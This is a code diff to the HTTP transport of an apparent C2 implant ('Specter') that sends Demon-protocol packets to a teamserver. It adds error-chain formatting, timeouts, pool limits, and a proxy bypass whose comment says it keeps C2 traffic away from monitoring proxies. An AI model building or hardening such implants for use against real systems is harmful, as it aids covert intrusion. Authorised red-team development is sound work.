@@ -8,6 +8,7 @@
 //! retries via DoH when HTTP fails and a `doh_domain` is configured.
 
 use std::sync::{Arc, Mutex};
+use std::time::Duration;
 
 use tracing::{debug, warn};
 
@@ -16,6 +17,22 @@ use red_cell_common::crypto::ecdh::AgentTransport;
 use crate::config::SpecterConfig;
 use crate::doh_transport::{DohProvider, DohTransport};
 use crate::error::SpecterError;
+
+/// Format a reqwest error including its full source chain.
+///
+/// `reqwest::Error::to_string()` (Display) may omit intermediate causes; traversing
+/// `std::error::Error::source()` manually surfaces the root OS error.
+fn format_reqwest_error(e: &reqwest::Error) -> String {
+    use std::error::Error as StdError;
+    let mut msg = e.to_string();
+    let mut src: Option<&dyn StdError> = e.source();
+    while let Some(cause) = src {
+        msg.push_str(": ");
+        msg.push_str(&cause.to_string());
+        src = cause.source();
+    }
+    msg
+}
 
 /// HTTP transport for sending Demon protocol packets to the teamserver.
 #[derive(Debug)]
@@ -30,8 +47,21 @@ impl HttpTransport {
     /// If `config.pinned_cert_pem` is set, the default WebPKI/system root certificates are
     /// disabled and only the pinned PEM certificate is trusted.  When no pinned cert is
     /// configured, the system CA store is used instead.
+    ///
+    /// System proxies are always bypassed: a C2 agent communicates directly with the
+    /// teamserver and must not route traffic through an operator-visible proxy.
     pub fn new(config: &SpecterConfig) -> Result<Self, SpecterError> {
-        let mut builder = reqwest::Client::builder().user_agent(&config.user_agent);
+        let mut builder = reqwest::Client::builder()
+            .user_agent(&config.user_agent)
+            // Bypass system and environment-variable proxies.  Routing C2 traffic through a
+            // proxy exposes the teamserver IP and prevents direct connectivity on Windows VMs
+            // where WinHTTP proxy settings may otherwise intercept outbound connections.
+            .no_proxy()
+            .connect_timeout(Duration::from_secs(10))
+            // Keep at most one idle connection alive to minimise socket-buffer consumption.
+            // On Windows VMs with limited non-paged-pool TCP quota, holding many idle IOCP
+            // sockets can exhaust the send-buffer pool (WSAENOBUFS / os error 10055).
+            .pool_max_idle_per_host(1);
 
         if let Some(pem) = &config.pinned_cert_pem {
             let cert = reqwest::Certificate::from_pem(pem.as_bytes())
@@ -54,7 +84,7 @@ impl HttpTransport {
             .body(packet.to_vec())
             .send()
             .await
-            .map_err(|e| SpecterError::Transport(e.to_string()))?;
+            .map_err(|e| SpecterError::Transport(format_reqwest_error(&e)))?;
 
         let status = response.status();
         if !status.is_success() {
